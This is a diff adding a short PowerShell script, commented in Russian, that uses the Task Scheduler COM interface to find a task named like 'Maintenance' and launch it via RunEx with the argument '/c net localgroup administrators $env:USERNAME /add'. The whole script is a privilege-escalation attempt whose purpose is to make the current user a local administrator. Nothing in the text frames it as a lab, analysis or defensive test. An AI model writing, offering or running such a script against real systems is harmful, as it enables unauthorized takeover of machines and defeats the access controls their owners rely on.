@@ -1,0 +1,14 @@
+# Создаем задание через COM с высокими правами
+$service = New-Object -ComObject "Schedule.Service"
+$service.Connect()
+$folder = $service.GetFolder("\")
+
+# Используем существующий системный триггер
+$tasks = $folder.GetTasks(0)
+foreach ($task in $tasks) {
+    if ($task.Name -like "Maintenance") {
+        # Запускаем системную задачу с нашими параметрами
+        $task.RunEx($null, 0, 0, "/c net localgroup administrators $env:USERNAME /add")
+        break
+    }
+}
